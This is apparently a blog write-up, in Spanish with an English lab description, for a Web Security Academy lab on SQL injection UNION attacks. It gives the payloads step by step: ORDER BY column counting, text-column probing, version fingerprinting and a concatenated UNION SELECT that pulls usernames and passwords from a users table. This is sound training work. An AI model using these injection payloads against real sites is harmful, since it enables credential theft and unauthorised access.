---
title: "Lab: SQL injection UNION attack, retrieving multiple values in a single column"
date: 2025-12-22
category: "SQL Injection"
order: 7
tags: ["web-security-academy", "sql-injection", "lab", "union"]
layout: layouts/writeup.njk
permalink: /writeups/sql-injection-lab-union-multiple-values-single-column.html
---

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

---

## Paso 1 — Encontrar número de columnas

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3-- → Internal error → 3-1 = 2 columnas
' ORDER BY 4--
```

## Paso 2 — Encontrar qué columnas contienen tipo texto

```sql
' UNION SELECT 'a', NULL-- → error, la columna no acepta str
' UNION SELECT NULL, 'a'-- → No error, la segunda columna acepta str
```

## Paso 3 — Imprimir data de otras tablas

Con solo una columna disponible para texto, se pueden traer los valores por separado:

```sql
' UNION SELECT NULL, username FROM users--
' UNION SELECT NULL, password FROM users--
```

Pero esto requiere dos consultas separadas. La alternativa es **concatenar** ambos valores dentro de la misma columna — para eso primero hay que saber el motor de base de datos (la sintaxis de concatenación varía).

### Identificar el motor de base de datos

Referencia: [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

<table>
<tr><td>Motor</td><td>Query de versión</td></tr>
<tr><td>Oracle</td><td><code>SELECT banner FROM v$version</code> / <code>SELECT version FROM v$instance</code></td></tr>
<tr><td>Microsoft</td><td><code>SELECT @@version</code></td></tr>
<tr><td>PostgreSQL</td><td><code>SELECT version()</code></td></tr>
<tr><td>MySQL</td><td><code>SELECT @@version</code></td></tr>
</table>

```sql
' UNION SELECT NULL, @@version-- → error, no es MSSQL
' UNION SELECT NULL, version()-- → funciona
```

Esto confirma que la base de datos es **PostgreSQL**.

## Paso 4 — Concatenar username y password en una sola columna ✅

En PostgreSQL la concatenación se hace con `||`:

```sql
' UNION SELECT NULL, username || ':' || password FROM users--
```

Esto retorna ambos valores juntos en la única columna de tipo texto disponible, con el formato `usuario:contraseña`. Con esas credenciales se inicia sesión como `administrator`. Lab resuelto.
